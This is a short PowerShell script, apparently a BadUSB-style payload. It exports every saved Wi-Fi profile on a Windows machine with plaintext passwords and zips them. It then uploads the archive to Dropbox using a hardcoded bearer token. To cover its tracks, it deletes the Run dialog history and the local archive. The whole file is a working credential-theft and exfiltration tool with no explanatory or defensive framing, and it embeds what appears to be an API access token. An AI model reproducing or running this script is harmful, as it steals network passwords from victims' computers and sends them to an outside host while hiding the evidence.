$RegistryPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
Remove-Item -Path $RegistryPath
mkdir $env:Temp\Netwerk
netsh wlan export profile key=clear folder=$env:Temp\Netwerk
Compress-Archive -Path $env:Temp\Netwerk\* -CompressionLevel NoCompression -DestinationPath $env:TMP\$env:USERNAME-$(get-date -f yyyy-MM-dd).zip
$TargetFilePath="/$env:USERNAME-$(get-date -f yyyy-MM-dd).zip"
$SourceFilePath="$env:TMP\$env:USERNAME-$(get-date -f yyyy-MM-dd).zip"
$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
$authorization = "Bearer " + "sl.BpfM75WyBPchj047mGU2DswISMkOBlDVcVtREt_3oELV8xglD4BwvrgmyS9a8w"+"D62k3DN2vKZU0f9OYXAwTx2HV6JKhxELKEoh1i0Creh-dQzbkudriL7OXENQ9VswvEQtcoOf5HnlyV"
$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$headers.Add("Authorization", $authorization)
$headers.Add("Dropbox-API-Arg", $arg)
$headers.Add("Content-Type", 'application/octet-stream')
Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
rm $SourceFilePath

